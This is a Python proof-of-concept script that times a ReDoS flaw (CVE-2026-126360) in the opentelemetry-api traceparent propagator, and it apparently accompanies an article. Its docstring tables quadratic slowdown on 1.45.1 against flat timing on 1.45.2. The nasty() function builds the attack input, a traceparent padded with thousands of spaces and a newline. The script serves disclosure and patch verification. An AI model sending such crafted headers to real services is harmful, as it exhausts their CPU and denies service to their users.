"""Reproduce the CVE-2026-126360 timing difference (article measurement).

Extract a traceparent carrying a long whitespace run and an embedded
newline, and time it. On opentelemetry-api 1.45.1 the propagator regex
backtracks quadratically (about 4x per doubling of the whitespace);
on 1.45.2 values over 512 characters are rejected before matching, so
the time stays flat. Run: ``python3 redos_probe.py``.

Measured on this VM (Python 3.12.3, one extract per size):

    spaces  1.45.1   1.45.2
      1000    4 ms  < 0.1 ms
      2000   15 ms  < 0.1 ms
      4000   59 ms  < 0.1 ms
      8000  240 ms  < 0.1 ms
     16000  930 ms  < 0.1 ms

Absolute times vary by machine; the doubling pattern is the point.
"""

import time

from opentelemetry import trace
from opentelemetry.trace.propagation.tracecontext import (
    TraceContextTextMapPropagator,
)

BASE = "00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01"


def nasty(spaces):
    """A valid traceparent, then a dash, whitespace, newline, junk."""
    return BASE + "-" + " " * spaces + "\n" + "x"


def main():
    propagator = TraceContextTextMapPropagator()
    print(f"{'spaces':>7} {'length':>7} {'seconds':>9} valid")
    for spaces in (1000, 2000, 4000, 8000, 16000):
        value = nasty(spaces)
        start = time.perf_counter()
        ctx = propagator.extract({"traceparent": value})
        elapsed = time.perf_counter() - start
        valid = trace.get_current_span(ctx).get_span_context().is_valid
        print(f"{spaces:>7} {len(value):>7} {elapsed:>9.3f} {valid}")
    ctx = propagator.extract({"traceparent": BASE})
    span_context = trace.get_current_span(ctx).get_span_context()
    print(
        "control:",
        span_context.is_valid,
        f"{span_context.trace_id:032x}",
    )


if __name__ == "__main__":
    main()
